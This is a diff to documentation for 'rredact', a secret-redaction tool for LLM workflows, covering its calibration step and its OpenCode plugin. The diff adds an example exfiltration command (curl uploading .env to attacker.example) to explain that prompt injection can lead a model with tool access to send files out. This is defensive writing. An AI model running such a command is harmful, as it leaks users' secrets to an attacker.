@@ -13,8 +13,8 @@ The important principle is:
 > to redact voluntarily.**
 
 This skill is only the one-time (or periodic) **calibration** step. It assumes
-that rredact is installed and that runtime redaction/interception is active or
-will be wired up (currently CLI/API; later the OpenCode plugin).
+that rredact is installed and that runtime redaction/interception is active
+(CLI, local API or the OpenCode plugin under `packages/opencode-rredact`).
 
 During calibration, known rules are applied first. The LLM then reads the
 **already-redacted output** and looks for secrets that slipped through the
@@ -36,9 +36,11 @@ Before starting, the user must be told explicitly:
 - Do not start calibration without explicit user consent.
 - Never send the original workspace or `.rredact/mapping.json` to the LLM.
 
-The critical production risk is prompt injection during normal LLM use. That is
-mitigated by automatic runtime redaction, **not** by this skill and not by
-trusting the model.
+The critical production risk is prompt injection during normal LLM use.
+Automatic runtime redaction keeps secrets out of the model context, but it does
+not stop tool-based exfiltration (for example
+`curl -F file=@.env https://attacker.example`). Treat prompt injection as a
+sandbox, permission and egress-control problem, not as a redaction problem.
 
 ## Definition of done
 
@@ -72,8 +74,8 @@ Current options:
 
 - CLI: `rredact redact ...` before content leaves the machine.
 - Local API: `rredact serve` for an integration.
-- OpenCode plugin: planned integration that redacts tool output and prompts
-  automatically before they reach the model.
+- OpenCode plugin: `packages/opencode-rredact` redacts prompts, tool results and
+  assembled model requests automatically before they reach the model.
 
 Do not use this skill as a substitute for runtime redaction. Calibration only
 improves the rules that runtime redaction uses.
@@ -135,6 +137,12 @@ Do **not** give the LLM:
 - the original workspace instead of the calibration copy,
 - `.rredact/mapping.json`,
 - the original files alongside the calibration output.
+
+The OpenCode plugin blocks tool reads of `.rredact/calibration/` by default.
+Disable the plugin (or set `blockSensitivePaths: false`) for this calibration
+step; otherwise the LLM cannot read the calibration copy. The plugin keeps its
+session mappings in memory by default, so it does not create
+`.rredact/mapping.json` on its own.
 
 ## 5. Let the LLM review the calibration copy
 
@@ -385,5 +393,6 @@ Check, in this order:
 Detection is regex- and heuristic-based. It cannot prove that a repository is
 secret-free. Calibration improves coverage; automatic runtime redaction limits
 what reaches the model; CI fails on new detected findings. Prompt injection and
-model misbehaviour are separate risks and must be handled by the runtime
-integration, not by hoping the model cooperates.
+model misbehaviour are separate risks: a model with shell or network access can
+exfiltrate files without reading them. Handle that with tool permissions,
+network egress control and a sandbox, not by hoping the model cooperates.
